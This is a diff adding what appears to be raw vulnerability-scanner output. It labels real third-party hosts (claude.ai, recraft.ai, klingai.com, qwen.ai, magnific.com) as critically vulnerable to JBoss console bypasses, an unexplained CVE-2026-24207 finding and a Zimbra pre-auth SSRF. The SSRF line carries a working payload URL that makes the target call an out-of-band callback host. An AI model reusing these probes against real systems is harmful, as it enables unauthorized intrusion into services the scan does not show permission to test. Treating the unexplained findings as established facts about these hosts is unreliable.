@@ -1,0 +1,8 @@
+[CVE-2010-0738:jmx-console-path-normalization-bypass] [http] [critical] https://contributor.magnific.com/jmx-console/HtmlAdaptor?action=inspectMBean&name=jboss.system:type=ServerInfo ["jmx-console /.;/ bypass: normalized=200 baseline=403"]
+[CVE-2010-0738:web-console-verb-bypass] [http] [critical] https://claude.ai/web-console/ServerInfo.jsp ["web-console verb-tampering: HEAD=200 GET=403"]
+[CVE-2026-24207] [http] [critical] https://api.recraft.ai/models
+[CVE-2026-24207] [http] [critical] https://jobapi.recraft.ai/models
+[CVE-2026-24207] [http] [critical] https://klingai.com/models
+[CVE-2026-24207] [http] [critical] https://staging.api.recraft.ai/models
+[CVE-2026-24207] [http] [critical] https://staging.jobapi.recraft.ai/models
+[zimbra-preauth-ssrf] [http] [critical] https://download.qwen.ai/service/error/sfdc_preauth.jsp?session=s&userid=1&server=http://dbhlfqt46120gd15vomg4yayj93harzzz.oast.fun%23.salesforce.com/
